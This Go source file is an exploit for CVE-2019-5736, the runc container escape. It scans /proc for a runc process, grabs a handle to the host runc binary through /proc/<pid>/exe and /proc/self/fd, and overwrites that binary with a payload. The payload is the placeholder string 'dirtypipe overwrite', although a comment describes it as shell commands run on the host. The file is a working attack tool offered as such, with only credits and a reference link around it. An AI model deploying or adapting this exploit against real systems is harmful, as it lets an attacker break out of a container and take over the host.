package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
)

// This is the line of shell commands that will execute on the host
var payload = "dirtypipe overwrite"

func main() {

	// Loop through all processes to find one whose cmdline includes runcinit
	// This will be the process created by runc
	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}

	// We will use the pid to get a file handle for runc on the host.
	var handleFd = -1
	for handleFd == -1 {
		// Note, you do not need to use the O_PATH flag for the exploit to work.
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println("[+] Successfully got the file handle /proc/self/fd/" + strconv.Itoa(handleFd))

	// Now that we have the file handle, lets write to the runc binary and overwrite it
	// It will maintain it's executable flag
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			fmt.Println("[+] Successfully got write handle", writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
}
